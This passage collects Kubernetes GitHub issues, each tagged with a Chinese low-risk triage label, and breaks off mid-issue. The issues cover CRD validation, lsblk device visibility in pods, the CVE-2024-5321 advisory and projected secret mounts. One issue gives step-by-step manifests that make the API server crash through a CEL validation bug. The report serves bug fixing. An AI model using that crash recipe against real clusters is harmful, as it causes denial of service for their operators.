- Issue 链接：[#126273](https://github.com/kubernetes/kubernetes/issues/126273)

### Issue 内容

#### What happened?

Previously a [issue reported ](https://github.com/kubernetes/kubernetes/issues/126133) for CRD schema conversion. 
We have a [quick fix ](https://github.com/kubernetes/kubernetes/pull/126167) for not panic the cluser.
We would love to have additional guards added to prevent invalid schema from getting in in the future.

From @liggitt : https://github.com/kubernetes/kubernetes/issues/126133#issuecomment-2231712524

#### What did you expect to happen?

Validation should prevent this type of schema(Items with type object/ properties with type array) from being accepted at all.

#### How can we reproduce it (as minimally and precisely as possible)?

Follow the steps described in https://github.com/kubernetes/kubernetes/issues/126133

#### Anything else we need to know?

_No response_

#### Kubernetes version

<details>

```console
$ kubectl version
# paste output here
```

</details>


#### Cloud provider

<details>

</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### 分析结果

低风险

---

## Issue #126262 See extra disks in container other than the one mounted inside the pod using lsblk command

- Issue 链接：[#126262](https://github.com/kubernetes/kubernetes/issues/126262)

### Issue 内容

#### What happened?

Here's the scenario I tested on k8 cluster:

Created two pods, each consuming its own PVC/PV (mounting only one volume for each pod), and both got scheduled on the same worker node.
Both pods are in a running state and volumes are mounted.
Observations:

Running the `lsblk` command on the worker node shows both blocks and their mounting paths. Please see below screenshot.

![image](https://github.com/user-attachments/assets/278fffef-2ded-47f7-a359-6c5c5ad225b0)

Running the same `lsblk` command from inside one of the app pods (using `exec -it bash`) lists both blocks but shows only one volume as mounted with its mount path. While In the manifest file of this pod I have only mounted one volume, why we are seeing other devices ?



-------------------------------------------------
 I tried to create a very simple and basic pod using below yaml file.

Note: Not using any PVC or dynamic provisioning and this pod also got scheduled to the same worker nodes where other 2 pods are already running and are consuming CSI vols. Even inside this container, if I am running lsblk command I can see sda, sdb.sdc , scnia, scnib etc. Even I haven't mounted anything inside pod.

```
apiVersion: v1
kind: Pod
metadata:
  name: my-nginx-pod
  labels:
    app: nginx
spec:
  containers:
  - name: nginx
    image: nginx:latest
    ports:
    - containerPort: 80 
```
![image](https://github.com/user-attachments/assets/bf3f8a59-c7f7-48d0-a64d-72400f59d777)

Question is that what are we seeing all these devices even without mounting it explicitly inside the pod.

There is no impact and issue in reading or writing the data and issue in functionality wise.


#### What did you expect to happen?

Not seeing any extra device other than the one that is mounted inside the pod explicitly.
If this is expected then why?

#### How can we reproduce it (as minimally and precisely as possible)?

Steps are mentioned in the description.

#### Anything else we need to know?

_No response_

#### Kubernetes version

<details>

```console
$ kubectl version
Client Version: v1.29.3
Kustomize Version: v5.0.4-0.20230601165947-6ce0bf390ce3
Server Version: v1.29.3
```

</details>


#### Cloud provider

<details>
NA
</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
NAME="openSUSE Leap"
VERSION="15.5"
ID="opensuse-leap"
ID_LIKE="suse opensuse"
VERSION_ID="15.5"
PRETTY_NAME="openSUSE Leap 15.5"
ANSI_COLOR="0;32"
CPE_NAME="cpe:/o:opensuse:leap:15.5"
BUG_REPORT_URL="https://bugs.opensuse.org"
HOME_URL="https://www.opensuse.org/"
DOCUMENTATION_URL="https://en.opensuse.org/Portal:Leap"
LOGO="distributor-logo-Leap"
$ uname -a
Linux master-1-XouLFUVP8VwOg 5.14.21-150500.55.68-default #1 SMP PREEMPT_DYNAMIC Wed Jun 5 21:39:05 UTC 2024 (40e256a) x86_64 x86_64 x86_64 GNU/Linux

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### 分析结果

低风险

---

## Issue #126161 CVE-2024-5321: Incorrect permissions on Windows containers logs

- Issue 链接：[#126161](https://github.com/kubernetes/kubernetes/issues/126161)

### Issue 内容

CVSS Rating: [CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:L/A:N](https://www.first.org/cvss/calculator/3.1#CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:L/A:N) - **MEDIUM** (6.1)

A security issue was discovered in Kubernetes clusters with Windows nodes where `BUILTIN\Users` may be able to read container logs and `NT AUTHORITY\Authenticated Users` may be able to modify container logs.

This issue has been rated **Medium** ([CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:L/A:N](https://www.first.org/cvss/calculator/3.1#CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:L/A:N)), and assigned **CVE-2024-5321**.

#### Am I vulnerable?

Any Kubernetes environment with Windows nodes is affected. Run `kubectl get nodes -l kubernetes.io/os=windows` to see if any Windows nodes are in use.

##### Affected Versions

- kubelet <= 1.27.15
- kubelet <= 1.28.11
- kubelet <= 1.29.6
- kubelet <= 1.30.2 

#### How do I mitigate this vulnerability?

This issue can be mitigated by applying the patch provided. The patch includes changes to `pkg/util/filesystem` that set file permissions on Windows and hardens the permissions for container logs for containers running on Windows.

##### Fixed Versions

- kubelet 1.27.16
- kubelet 1.28.12
- kubelet 1.29.7
- kubelet 1.30.3 

To upgrade, refer to the documentation: https://kubernetes.io/docs/tasks/administer-cluster/cluster-upgrade/ 

#### Detection

Any Kubernetes environment with Windows nodes is affected. Run `kubectl get nodes -l kubernetes.io/os=windows` to see if any Windows nodes are in use.

If you find evidence that this vulnerability has been exploited, please contact security@kubernetes.io

##### Acknowledgements

This vulnerability was reported by Paulo Gomes @pjbgf from SUSE.

The issue was fixed and coordinated by the fix team: 
Mark Rossetti @marosset 
James Sturtevant @jsturtevant 
Craig Ingram @cji 
Rita Zhang @ritazh

and release managers:
Sascha Grunert @saschagrunert
Jeremy Rickard @jeremyrickard
Carlos Panato @cpanato
Jim Angel @jimangel

<!-- labels -->
/area security
/kind bug
/committee security-response
/sig windows
/area kubelet
/triage accepted
/lifecycle frozen


### 分析结果

低风险

---

## Issue #126133 CEL validation can cause APIServer to crashloop

- Issue 链接：[#126133](https://github.com/kubernetes/kubernetes/issues/126133)

### Issue 内容

#### What happened?

We observed a scenario that can cause APIServer to crash due to a CEL validation issue for CRD.
There's an edge case that when a CRD schema is updated after a CR instance is created, CRD finalizer can cause APIServer to crash when the CRD is being deleted.
Updating the CRD schema after some CRs are created can be problematic, but it should fail gracefully instead of crash.

<details>
<summary>
Sample stack trace
</summary>

```
http: panic serving 10.44.11.12:52946: runtime error: invalid memory address or nil pointer dereference

goroutine 100444784 [running]:

net/http.(*conn).serve.func1()

    net/http/server.go:1868 +0xb9

panic({0x42d7a80?, 0x7a07d50?})

    runtime/panic.go:920 +0x270

k8s.io/apimachinery/pkg/util/runtime.HandleCrash({0xc07f113608, 0x1, 0xfffffffe?})

    k8s.io/apimachinery@v0.0.0/pkg/util/runtime/runtime.go:56 +0xcd

panic({0x42d7a80?, 0x7a07d50?})

    runtime/panic.go:914 +0x21f

k8s.io/apiserver/pkg/server.DefaultBuildHandlerChain.WithAudit.func6.1.1()

    k8s.io/apiserver@v0.0.0/pkg/endpoints/filters/audit.go:84 +0x25

k8s.io/apiserver/pkg/server.DefaultBuildHandlerChain.WithAudit.func6.1()

    k8s.io/apiserver@v0.0.0/pkg/endpoints/filters/audit.go:93 +0x23f

panic({0x42d7a80?, 0x7a07d50?})

    runtime/panic.go:914 +0x21f

k8s.io/apiserver/pkg/cel.(*DeclType).IsObject(...)

    k8s.io/apiserver@v0.0.0/pkg/cel/types.go:223

k8s.io/apiserver/pkg/cel.(*DeclType).MaybeAssignTypeName(0x0, {0xc05c767bf0?, 0x0?})

    k8s.io/apiserver@v0.0.0/pkg/cel/types.go:117 +0x2d

k8s.io/apiextensions-apiserver/pkg/apiserver/schema/cel.prepareEnvSet(0x418768?, 0xc07f113de0?)

    k8s.io/apiextensions-apiserver@v0.0.0/pkg/apiserver/schema/cel/compilation.go:150 +0x45

k8s.io/apiextensions-apiserver/pkg/apiserver/schema/cel.Compile(0xc00f930420, 0x0, 0x23701c7?, 0xc07f114058?, {0x5494948, 0x4ef9790})

    k8s.io/apiextensions-apiserver@v0.0.0/pkg/apiserver/schema/cel/compilation.go:130 +0x11a

k8s.io/apiextensions-apiserver/pkg/apiserver/schema/cel.validator(0xc00f930420, 0x0, 0x0, 0xc07f114290?)

    k8s.io/apiextensions-apiserver@v0.0.0/pkg/apiserver/schema/cel/validation.go:94 +0xc9

k8s.io/apiextensions-apiserver/pkg/apiserver/schema/cel.validator(0xc04c9bbc30, 0x0, 0xc096d67080, 0x8?)

    k8s.io/apiextensions-apiserver@v0.0.0/pkg/apiserver/schema/cel/validation.go:98 +0x11b

k8s.io/apiextensions-apiserver/pkg/apiserver/schema/cel.validator(0xc04c9bbad0, 0x0, 0xc096d67100, 0x4?)

    k8s.io/apiextensions-apiserver@v0.0.0/pkg/apiserver/schema/cel/validation.go:120 +0x358

k8s.io/apiextensions-apiserver/pkg/apiserver/schema/cel.validator(0xc00f930210, 0x1, 0xc096d67280, 0xc03ea2c340?)

    k8s.io/apiextensions-apiserver@v0.0.0/pkg/apiserver/schema/cel/validation.go:120 +0x358

k8s.io/apiextensions-apiserver/pkg/apiserver/schema/cel.NewValidator(0xc00f930210, 0x83?, 0x23?)

    k8s.io/apiextensions-apiserver@v0.0.0/pkg/apiserver/schema/cel/validation.go:86 +0x85

k8s.io/apiextensions-apiserver/pkg/registry/customresource.NewStrategy({_, _}, _, {{_, _}, {_, _}, {_, _}}, {0x548eb18, ...}, ...)

    k8s.io/apiextensions-apiserver@v0.0.0/pkg/registry/customresource/strategy.go:69 +0xb6

k8s.io/apiextensions-apiserver/pkg/apiserver.(*crdHandler).getOrCreateServingInfoFor(0xc00146d810, {0xc04b5b8c90?, 0x1a?}, {0xc08114f360, 0x1a})

    k8s.io/apiextensions-apiserver@v0.0.0/pkg/apiserver/customresource_handler.go:802 +0x18da

k8s.io/apiextensions-apiserver/pkg/apiserver.(*crdHandler).ServeHTTP(0xc00146d810, {0x549cd90, 0xc053b3c4b0}, 0xc07aaa0600)

    k8s.io/apiextensions-apiserver@v0.0.0/pkg/apiserver/customresource_handler.go:295 +0x905

k8s.io/apiserver/pkg/server/mux.(*pathHandler).ServeHTTP(0xc006a54380, {0x549cd90, 0xc053b3c4b0}, 0xc07aaa0600)

    k8s.io/apiserver@v0.0.0/pkg/server/mux/pathrecorder.go:249 +0x41d

k8s.io/apiserver/pkg/server/mux.(*PathRecorderMux).ServeHTTP(0xc0b54960c4?, {0x549cd90?, 0xc053b3c4b0?}, 0xc0158c6b00?)

    k8s.io/apiserver@v0.0.0/pkg/server/mux/pathrecorder.go:235 +0x66

k8s.io/apiserver/pkg/server.director.ServeHTTP({{0x4c9aa69?, 0x555a555569155555?}, 0xc00138d320?, 0xc00016b8f0?}, {0x549cd90, 0xc053b3c4b0}, 0xc07aaa0600)

    k8s.io/apiserver@v0.0.0/pkg/server/handler.go:154 +0x6f1

k8s.io/apiserver/pkg/server/mux.(*pathHandler).ServeHTTP(0xc012ce2c40, {0x549cd90, 0xc053b3c4b0}, 0xc07aaa0600)

    k8s.io/apiserver@v0.0.0/pkg/server/mux/pathrecorder.go:255 +0x56a

k8s.io/apiserver/pkg/server/mux.(*PathRecorderMux).ServeHTTP(0xc0b54960c4?, {0x549cd90?, 0xc053b3c4b0?}, 0x4fc39e?)

    k8s.io/apiserver@v0.0.0/pkg/server/mux/pathrecorder.go:235 +0x66

k8s.io/apiserver/pkg/server.director.ServeHTTP({{0x4c76d39?, 0xc011a13d40?}, 0xc0015838c0?, 0xc000317340?}, {0x549cd90, 0xc053b3c4b0}, 0xc07aaa0600)

    k8s.io/apiserver@v0.0.0/pkg/server/handler.go:154 +0x6f1

k8s.io/kube-aggregator/pkg/apiserver.(*proxyHandler).ServeHTTP(0xc0745bd0b0?, {0x549cd90?, 0xc053b3c4b0?}, 0x23?)

    k8s.io/kube-aggregator@v0.0.0/pkg/apiserver/handler_proxy.go:112 +0x152

k8s.io/apiserver/pkg/server/mux.(*pathHandler).ServeHTTP(0xc04b5b6640, {0x549cd90, 0xc053b3c4b0}, 0xc07aaa0600)

    k8s.io/apiserver@v0.0.0/pkg/server/mux/pathrecorder.go:249 +0x41d

k8s.io/apiserver/pkg/server/mux.(*PathRecorderMux).ServeHTTP(0xc0b54960c4?, {0x549cd90?, 0xc053b3c4b0?}, 0x1?)

    k8s.io/apiserver@v0.0.0/pkg/server/mux/pathrecorder.go:235 +0x66

k8s.io/apiserver/pkg/server.director.ServeHTTP({{0x4c7a111?, 0x40e74c?}, 0xc00357dd40?, 0xc0041438f0?}, {0x549cd90, 0xc053b3c4b0}, 0xc07aaa0600)

    k8s.io/apiserver@v0.0.0/pkg/server/handler.go:154 +0x6f1

k8s.io/apiserver/pkg/server.DefaultBuildHandlerChain.TrackCompleted.trackCompleted.func21({0x549cd90?, 0xc053b3c4b0}, 0xc07aaa0600)

    k8s.io/apiserver@v0.0.0/pkg/endpoints/filterlatency/filterlatency.go:110 +0x177

net/http.HandlerFunc.ServeHTTP(0x54ad4d0?, {0x549cd90?, 0xc053b3c4b0?}, 0x4?)

    net/http/server.go:2136 +0x29

k8s.io/apiserver/pkg/endpoints/filters.withAuthorization.func1({0x549cd90, 0xc053b3c4b0}, 0xc07aaa0600)

    k8s.io/apiserver@v0.0.0/pkg/endpoints/filters/authorization.go:78 +0x639

net/http.HandlerFunc.ServeHTTP(0x8a62a0?, {0x549cd90?, 0xc053b3c4b0?}, 0x3?)

    net/http/server.go:2136 +0x29

k8s.io/apiserver/pkg/endpoints/filterlatency.trackStarted.func1({0x549cd90, 0xc053b3c4b0}, 0xc07aaa0600)

    k8s.io/apiserver@v0.0.0/pkg/endpoints/filterlatency/filterlatency.go:84 +0x192

net/http.HandlerFunc.ServeHTTP(0x490a1c0?, {0x549cd90?, 0xc053b3c4b0?}, 0x5467f10?)

    net/http/server.go:2136 +0x29

k8s.io/apiserver/pkg/server.DefaultBuildHandlerChain.TrackCompleted.trackCompleted.func22({0x549cd90?, 0xc053b3c4b0}, 0xc07aaa0600)

    k8s.io/apiserver@v0.0.0/pkg/endpoints/filterlatency/filterlatency.go:110 +0x177

net/http.HandlerFunc.ServeHTTP(0x54ad4d0?, {0x549cd90?, 0xc053b3c4b0?}, 0x5467f10?)

    net/http/server.go:2136 +0x29

k8s.io/apiserver/pkg/server/filters.(*priorityAndFairnessHandler).Handle(0xc003fdec30, {0x549cd90?, 0xc053b3c4b0}, 0xc07aaa0400)

    k8s.io/apiserver@v0.0.0/pkg/server/filters/priority-and-fairness.go:271 +0x9ff

net/http.HandlerFunc.ServeHTTP(0x8a62a0?, {0x549cd90?, 0xc053b3c4b0?}, 0x3?)

    net/http/server.go:2136 +0x29

k8s.io/apiserver/pkg/endpoints/filterlatency.trackStarted.func1({0x549cd90, 0xc053b3c4b0}, 0xc07aaa0400)

    k8s.io/apiserver@v0.0.0/pkg/endpoints/filterlatency/filterlatency.go:84 +0x192

net/http.HandlerFunc.ServeHTTP(0x490a1c0?, {0x549cd90?, 0xc053b3c4b0?}, 0x5467f10?)

    net/http/server.go:2136 +0x29

k8s.io/apiserver/pkg/server.DefaultBuildHandlerChain.TrackCompleted.trackCompleted.func23({0x549cd90?, 0xc053b3c4b0}, 0xc07aaa0400)

    k8s.io/apiserver@v0.0.0/pkg/endpoints/filterlatency/filterlatency.go:110 +0x177

net/http.HandlerFunc.ServeHTTP(0xc0158c80a8?, {0x549cd90?, 0xc053b3c4b0?}, 0xc0901c0020?)

    net/http/server.go:2136 +0x29

k8s.io/apiserver/pkg/server.DefaultBuildHandlerChain.WithImpersonation.func4({0x549cd90, 0xc053b3c4b0}, 0xc082fc4700)

    k8s.io/apiserver@v0.0.0/pkg/endpoints/filters/impersonation.go:182 +0x1902

net/http.HandlerFunc.ServeHTTP(0x8a62a0?, {0x549cd90?, 0xc053b3c4b0?}, 0x0?)

    net/http/server.go:2136 +0x29

k8s.io/apiserver/pkg/endpoints/filterlatency.trackStarted.func1({0x549cd90, 0xc053b3c4b0}, 0xc082fc4700)

    k8s.io/apiserver@v0.0.0/pkg/endpoints/filterlatency/filterlatency.go:84 +0x192

net/http.HandlerFunc.ServeHTTP(0x490a1c0?, {0x549cd90?, 0xc053b3c4b0?}, 0x5467f10?)

    net/http/server.go:2136 +0x29

k8s.io/apiserver/pkg/server.DefaultBuildHandlerChain.TrackCompleted.trackCompleted.func24({0x549cd90?, 0xc053b3c4b0}, 0xc082fc4700)

    k8s.io/apiserver@v0.0.0/pkg/endpoints/filterlatency/filterlatency.go:110 +0x177

net/http.HandlerFunc.ServeHTTP(0xc000d13c80?, {0x549cd90?, 0xc053b3c4b0?}, 0x54ad4d0?)

    net/http/server.go:2136 +0x29

k8s.io/apiserver/pkg/server.DefaultBuildHandlerChain.WithAudit.func6({0x54a9600, 0xc0672f27e0}, 0x547c9e0?)

    k8s.io/apiserver@v0.0.0/pkg/endpoints/filters/audit.go:115 +0x395

net/http.HandlerFunc.ServeHTTP(0x8a62a0?, {0x54a9600?, 0xc0672f27e0?}, 0x0?)

    net/http/server.go:2136 +0x29

k8s.io/apiserver/pkg/endpoints/filterlatency.trackStarted.func1({0x54a9600, 0xc0672f27e0}, 0xc082fc4700)

    k8s.io/apiserver@v0.0.0/pkg/endpoints/filterlatency/filterlatency.go:84 +0x192

net/http.HandlerFunc.ServeHTTP(0x490a1c0?, {0x54a9600?, 0xc0672f27e0?}, 0x5467f10?)

    net/http/server.go:2136 +0x29

k8s.io/apiserver/pkg/server.DefaultBuildHandlerChain.TrackCompleted.trackCompleted.func26({0x54a9600?, 0xc0672f27e0}, 0xc082fc4700)

    k8s.io/apiserver@v0.0.0/pkg/endpoints/filterlatency/filterlatency.go:110 +0x177

net/http.HandlerFunc.ServeHTTP(0x54ad4d0?, {0x54a9600?, 0xc0672f27e0?}, 0x545fde0?)

    net/http/server.go:2136 +0x29

k8s.io/apiserver/pkg/endpoints/filters.withAuthentication.func1({0x54a9600, 0xc0672f27e0}, 0xc082fc4700)

    k8s.io/apiserver@v0.0.0/pkg/endpoints/filters/authentication.go:120 +0x7e5

net/http.HandlerFunc.ServeHTTP(0x54ad4d0?, {0x54a9600?, 0xc0672f27e0?}, 0x5467f10?)

    net/http/server.go:2136 +0x29

k8s.io/apiserver/pkg/endpoints/filterlatency.trackStarted.func1({0x54a9600, 0xc0672f27e0}, 0xc07c2ffe00)

    k8s.io/apiserver@v0.0.0/pkg/endpoints/filterlatency/filterlatency.go:94 +0x37a

net/http.HandlerFunc.ServeHTTP(0xc07c2ffe00?, {0x54a9600?, 0xc0672f27e0?}, 0xc00be6a100?)

    net/http/server.go:2136 +0x29

k8s.io/apiserver/pkg/server/filters.(*timeoutHandler).ServeHTTP(0xc003ffa450, {0x54a9600, 0xc0672f27e0}, 0xc0b54960c0?)

    k8s.io/apiserver@v0.0.0/pkg/server/filters/timeout.go:87 +0x346

k8s.io/apiserver/pkg/server.DefaultBuildHandlerChain.WithRequestDeadline.withRequestDeadline.func27({0x54a9600, 0xc0672f27e0}, 0xc07c2ffe00)

    k8s.io/apiserver@v0.0.0/pkg/endpoints/filters/request_deadline.go:65 +0x3f3

net/http.HandlerFunc.ServeHTTP(0x54ad4d0?, {0x54a9600?, 0xc0672f27e0?}, 0x47eef40?)

    net/http/server.go:2136 +0x29

k8s.io/apiserver/pkg/server.DefaultBuildHandlerChain.WithWaitGroup.withWaitGroup.func28({0x54a9600, 0xc0672f27e0}, 0xc0158c8d98?)

    k8s.io/apiserver@v0.0.0/pkg/server/filters/waitgroup.go:65 +0x1cc

net/http.HandlerFunc.ServeHTTP(0xc000081ed0?, {0x54a9600?, 0xc0672f27e0?}, 0x842718?)

    net/http/server.go:2136 +0x29

k8s.io/apiserver/pkg/server/filters.(*goaway).ServeHTTP(0xc003ffd920, {0x54a9600, 0xc0672f27e0}, 0xc07c2ffe00)

    k8s.io/apiserver@v0.0.0/pkg/server/filters/goaway.go:72 +0x142

k8s.io/apiserver/pkg/server.DefaultBuildHandlerChain.WithWarningRecorder.func13({0x54a9600?, 0xc0672f27e0}, 0xc053b3c090?)

    k8s.io/apiserver@v0.0.0/pkg/endpoints/filters/warning.go:35 +0xc6

net/http.HandlerFunc.ServeHTTP(0x4a10120?, {0x54a9600?, 0xc0672f27e0?}, 0x4c81012?)

    net/http/server.go:2136 +0x29

k8s.io/apiserver/pkg/server.DefaultBuildHandlerChain.WithCacheControl.func14({0x54a9600, 0xc0672f27e0}, 0x0?)

    k8s.io/apiserver@v0.0.0/pkg/endpoints/filters/cachecontrol.go:31 +0xa7

net/http.HandlerFunc.ServeHTTP(0xc0833e5e50?, {0x54a9600?, 0xc0672f27e0?}, 0xc0158c8f20?)

    net/http/server.go:2136 +0x29

k8s.io/apiserver/pkg/server.DefaultBuildHandlerChain.WithHTTPLogging.WithLogging.withLogging.func34({0x54a9600, 0xc0672f27e0}, 0x1?)

    k8s.io/apiserver@v0.0.0/pkg/server/httplog/httplog.go:111 +0x95

net/http.HandlerFunc.ServeHTTP(0xc0af0b1950?, {0x54a9600?, 0xc0672f27e0?}, 0xc03ea2c340?)

    net/http/server.go:2136 +0x29

k8s.io/apiserver/pkg/endpoints/filters.WithTracing.func1({0x54a9600?, 0xc0672f27e0?}, 0xc07c2ffd00?)

    k8s.io/apiserver@v0.0.0/pkg/endpoints/filters/traces.go:42 +0x222

net/http.HandlerFunc.ServeHTTP(0x54ad4d0?, {0x54a9600?, 0xc0672f27e0?}, 0x5467f10?)

    net/http/server.go:2136 +0x29

go.opentelemetry.io/contrib/instrumentation/net/http/otelhttp.(*middleware).serveHTTP(0xc004dd6160, {0x5498f60?, 0xc04331cc40}, 0xc07c2ffb00, {0x5478720, 0xc003ffa4e0})

    go.opentelemetry.io/contrib/instrumentation/net/http/otelhttp@v0.44.0/handler.go:217 +0x1202

go.opentelemetry.io/contrib/instrumentation/net/http/otelhttp.NewMiddleware.func1.1({0x5498f60?, 0xc04331cc40?}, 0x5?)

    go.opentelemetry.io/contrib/instrumentation/net/http/otelhttp@v0.44.0/handler.go:81 +0x35

net/http.HandlerFunc.ServeHTTP(0x54ad4d0?, {0x5498f60?, 0xc04331cc40?}, 0xc07c2ffb00?)

    net/http/server.go:2136 +0x29

k8s.io/apiserver/pkg/server.DefaultBuildHandlerChain.WithLatencyTrackers.func16({0x5498f60?, 0xc04331cc40}, 0xc07c2ffb00?)

    k8s.io/apiserver@v0.0.0/pkg/endpoints/filters/webhook_duration.go:47 +0x172

net/http.HandlerFunc.ServeHTTP(0xc07c2ffa00?, {0x5498f60?, 0xc04331cc40?}, 0x7f22b516b5b8?)

    net/http/server.go:2136 +0x29

k8s.io/apiserver/pkg/server.DefaultBuildHandlerChain.WithRequestInfo.func17({0x5498f60, 0xc04331cc40}, 0xc07c2ffa00?)

    k8s.io/apiserver@v0.0.0/pkg/endpoints/filters/requestinfo.go:39 +0x118

net/http.HandlerFunc.ServeHTTP(0xc07c2ff900?, {0x5498f60?, 0xc04331cc40?}, 0x80eb343ab745?)

    net/http/server.go:2136 +0x29

k8s.io/apiserver/pkg/server.DefaultBuildHandlerChain.WithRequestReceivedTimestamp.withRequestReceivedTimestampWithClock.func31({0x5498f60, 0xc04331cc40}, 0x4106d3?)

    k8s.io/apiserver@v0.0.0/pkg/endpoints/filters/request_received_time.go:38 +0xaf

net/http.HandlerFunc.ServeHTTP(0x150?, {0x5498f60?, 0xc04331cc40?}, 0x7f226329e938?)

    net/http/server.go:2136 +0x29

k8s.io/apiserver/pkg/server.DefaultBuildHandlerChain.WithMuxAndDiscoveryComplete.func18({0x5498f60?, 0xc04331cc40?}, 0xc07c2ff900?)

    k8s.io/apiserver@v0.0.0/pkg/endpoints/filters/mux_discovery_complete.go:52 +0xd5

net/http.HandlerFunc.ServeHTTP(0xc000096400?, {0x5498f60?, 0xc04331cc40?}, 0xc0158c9a18?)

    net/http/server.go:2136 +0x29

k8s.io/apiserver/pkg/server.DefaultBuildHandlerChain.WithPanicRecovery.withPanicRecovery.func32({0x5498f60?, 0xc04331cc40?}, 0xc053b3c090?)

    k8s.io/apiserver@v0.0.0/pkg/server/filters/wrap.go:74 +0xa6

net/http.HandlerFunc.ServeHTTP(0x54ad4d0?, {0x5498f60?, 0xc04331cc40?}, 0xc06de83470?)

    net/http/server.go:2136 +0x29

k8s.io/apiserver/pkg/server.DefaultBuildHandlerChain.WithAuditInit.withAuditInit.func33({0x5498f60, 0xc04331cc40}, 0xc0158c9b18?)

    k8s.io/apiserver@v0.0.0/pkg/endpoints/filters/audit_init.go:63 +0x12c

net/http.HandlerFunc.ServeHTTP(0xc0158c9b68?, {0x5498f60?, 0xc04331cc40?}, 0x0?)

    net/http/server.go:2136 +0x29

k8s.io/apiserver/pkg/server.(*APIServerHandler).ServeHTTP(0x7a85a00?, {0x5498f60?, 0xc04331cc40?}, 0xc0158c9b50?)

    k8s.io/apiserver@v0.0.0/pkg/server/handler.go:189 +0x25

net/http.serverHandler.ServeHTTP({0xc0836e76b0?}, {0x5498f60?, 0xc04331cc40?}, 0x6?)

    net/http/server.go:2938 +0x8e

net/http.(*conn).serve(0xc0a9d997a0, {0x54ad4d0, 0xc00ccbda70})

    net/http/server.go:2009 +0x5f4

created by net/http.(*Server).Serve in goroutine 2661

    net/http/server.go:3086 +0x5cb
```

</details>

#### What did you expect to happen?

APIServer not to crash

#### How can we reproduce it (as minimally and precisely as possible)?


Step 1:
```
$ kubectl create -f crd.yaml
```

<details>
<summary>
Content of crd.yaml
</summary>

```yaml
# crd.yaml
apiVersion: apiextensions.k8s.io/v1
kind: CustomResourceDefinition
metadata:
  name: shirts.stable.example.com
spec:
  group: stable.example.com
  names:
    plural: shirts
    singular: shirt
    kind: Shirt
  scope: Cluster
  versions:
    - name: v1
      schema:
        openAPIV3Schema:
          properties:
            spec:
              properties:
                backend:
                  items:
                    properties:
                      replicas:
                        type: integer
                    required:
                      - replicas
                    type: object
                    x-kubernetes-validations:
                      - message: Replicas can be set in beetwen 0 to 10.
                        rule: 0 <= self.replicas && self.replicas <= 10
                  type: array
              type: object
          type: object
      served: true
      storage: true
```
</details>

Step 2:
```
$ kubectl create -f cr.yaml
```

<details>
<summary>
Content of cr.yaml
</summary>

```yaml
# cr.yaml
apiVersion: stable.example.com/v1
kind: Shirt
metadata:
  name: test-cr
spec :
  backend:
    - replicas: 8
```

</details>

Step 3:

```
$ kubectl replace -f crd2.yaml
```

<details>
<summary>
Content of crd2.yaml
</summary>

```yaml
apiVersion: apiextensions.k8s.io/v1
kind: CustomResourceDefinition
metadata:
  name: shirts.stable.example.com
spec:
  group: stable.example.com
  names:
    plural: shirts
    singular: shirt
    kind: Shirt
  scope: Cluster
  versions:
    - name: v1
      schema:
        openAPIV3Schema:
          properties:
            spec:
              properties:
                backend:
                  description: Backend service tracking parameters
                  items:
                    properties:
                      replicas:
                        type: integer
                    required:
                      - replicas
                    type: object
                    x-kubernetes-validations:
                      - message: Replicas can be set in beetwen 0 to 10.
                        rule: 0 <= self.replicas && self.replicas <= 10
                  type: object  # <========= changed
              type: object
          type: object
      served: true
      storage: true
```

</details>

Step 4:
```
$ kubectl delete -f crd.yaml
```

#### Anything else we need to know?

_No response_

#### Kubernetes version

<details>

At least 1.29 and 1.30. 

</details>


#### Cloud provider

<details>
EKS
</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### 分析结果

低风险

---

## Issue #126112 Projected secrets mounted with a subPath disappear after the secret is updated.

- Issue 链接：[#126112](https://github.com/kubernetes/kubernetes/issues/126112)

### Issue 内容

#### What happened?

I want to prevent kubernetes from automatically updating my mounted secrets. I project my secrets in a volume and mount them with a subpath to unlink them. In the configuration I see the files I expect and they are unlinked. After I update the secret I mounted the files disappear from the pod.

#### What did you expect to happen?

I expect nothing to happen. I have unlinked the secrets and after a update of the secret I expect my pod to be unaffected.

#### How can we reproduce it (as minimally and precisely as possible)?

```
apiVersion: v1
kind: Pod
metadata:
  name: mypod-no-update
spec:
  containers:
  - name: mycontainer
    image: busybox
    command: ['sh', '-c', 'sleep 3000']
    volumeMounts:
    - name: mysecrets
      mountPath: /etc/secret-volume
      subPath: cert
      # Optional: You can specify read-only here
      readOnly: true
  volumes:
  - name: mysecrets
    projected:
      sources:
      - secret:
          name: mysecret
          items:
            - key: username
              path: cert/mysecret.txt
          # Optional: You can specify defaultMode here, which is reflected in 
          # the file permissions for the files created from the secret
---
apiVersion: v1
data:
  password: bXlwYXNzd29yZA==
  username: bXl1c2Vy
kind: Secret
metadata:
  name: mysecret
type: Opaque
```

Apply these resources check if the file is present in the pod. Edit the secret and see that file disappears.

#### Anything else we need to know?

The functionality does work when you created a volume mount per file.

#### Kubernetes version

Client Version: v1.28.2
Kustomize Version: v5.0.4-0.20230601165947-6ce0bf390ce3
Server Version: v1.29.4 and     v1.27.13+e709aa5


#### Cloud provider

Locally and also tested on Openshift 

#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
PRETTY_NAME="Ubuntu 22.04.4 LTS"
NAME="Ubuntu"
VERSION_ID="22.04"
VERSION="22.04.4 LTS (Jammy Jellyfish)"
VERSION_CODENAME=jammy
ID=ubuntu
